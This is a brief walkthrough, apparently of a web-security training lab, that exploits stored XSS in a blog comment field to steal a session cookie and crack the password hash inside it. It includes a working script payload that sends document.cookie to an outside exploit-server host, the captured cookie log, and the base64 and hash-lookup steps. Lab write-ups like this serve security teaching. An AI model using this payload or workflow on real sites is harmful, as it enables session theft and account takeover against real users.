# Lab: Offline password cracking
## Description

1. Found the XSS in the blog comment field.
2. Submitted the following payload `<script>document.location="https://exploit-ac1e1f6c1ecea250c0c208e901180029.web-security-academy.net/"+document.cookie;</script>` into the comment field.
3. Grabbed the cookies from the exploit server, which looked something like this:
```
172.31.30.162   2022-01-15 14:17:05 +0000 "GET /secret=aTDxxo7FfVo8jm6BsH5PycXivAKqxhKS;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz HTTP/1.1" 404 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
```
4. The stay-logged-in cookie `Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz` contains the following after base64 decoding it `carlos:26323c16d5f4dabff3bb136f2460a943`
5. I used https://crackstation.net/ to "crack" the password


## Solution
See description
